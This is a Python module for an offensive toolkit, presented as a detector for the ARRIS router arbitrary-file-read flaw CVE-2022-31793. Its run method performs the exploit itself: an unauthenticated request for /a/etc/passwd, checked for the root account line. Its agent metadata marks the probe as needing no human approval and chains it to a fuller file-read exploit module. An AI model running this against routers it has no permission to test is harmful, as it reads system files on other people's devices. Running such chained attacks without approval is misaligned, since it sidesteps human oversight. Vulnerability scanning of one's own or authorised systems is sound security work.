#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARRIS router arbitrary file read via /a/<path> (CVE-2022-31793)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ARRIS Router - Arbitrary File Read Detection (CVE-2022-31793)',
        'description': (
            'Multiple ARRIS routers expose arbitrary files via GET /a/<absolute-path> '
            'without authentication (CVE-2022-31793).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2022', 'arris', 'router', 'lfi',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/arris_cve_2022_31793_file_read',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-31793'],
        'cve': 'CVE-2022-31793',
    }

    def run(self):
        path = '/a/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='ARRIS CVE-2022-31793 arbitrary file read',
                path=path,
            )
            return True
        return False
